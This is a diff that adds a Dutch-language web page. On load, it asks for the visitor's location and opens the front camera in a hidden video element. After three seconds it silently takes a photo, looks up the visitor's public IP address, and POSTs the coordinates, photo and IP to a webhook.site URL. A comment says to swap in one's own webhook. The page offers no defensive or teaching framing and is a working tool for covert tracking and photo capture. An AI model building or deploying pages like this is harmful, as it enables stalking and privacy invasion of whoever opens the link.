@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Toestemming Vragen</title>
+</head>
+<body>
+    <h1>Gegevens Verzamelen</h1>
+    <p id="location"></p>
+    <video id="video" width="300" height="300" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <p id="ip"></p>
+
+    <script>
+        // Start de toestemming aanvraag direct bij het laden van de pagina
+        window.onload = function() {
+            getAllData();
+        };
+
+        function getAllData() {
+            getLocation();
+            useCamera();
+            getIP();
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                document.getElementById("location").innerHTML = "Locatie niet ondersteund.";
+            }
+        }
+
+        function showPosition(position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let mapLink = `<a href="https://www.google.com/maps/@${latitude},${longitude},15z" target="_blank">Bekijk locatie op Google Maps</a>`;
+            document.getElementById("location").innerHTML = `Latitude: ${latitude}<br>Longitude: ${longitude}<br>${mapLink}`;
+            sendToServer({
+                "type": "locatie",
+                "latitude": latitude,
+                "longitude": longitude
+            });
+        }
+
+        function useCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(takePhoto, 3000);
+            })
+            .catch(function(err) {
+                console.log("Error: " + err);
+            });
+        }
+
+        function takePhoto() {
+            var video = document.getElementById('video');
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var imageData = canvas.toDataURL('image/png');
+            sendToServer({
+                "type": "foto",
+                "image": imageData
+            });
+        }
+
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("ip").innerHTML = "IP Adres: " + data.ip;
+                sendToServer({
+                    "type": "ip-adres",
+                    "ip": data.ip
+                });
+            });
+        }
+
+        function sendToServer(data) {
+            let webhookURL = 'https://be11c5f6-62b3-4ef7-9305-794e453df341.webhook.site/
+'; // Vervang door je Webhook URL
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.text())
+            .then(result => console.log('Data verstuurd:', result))
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
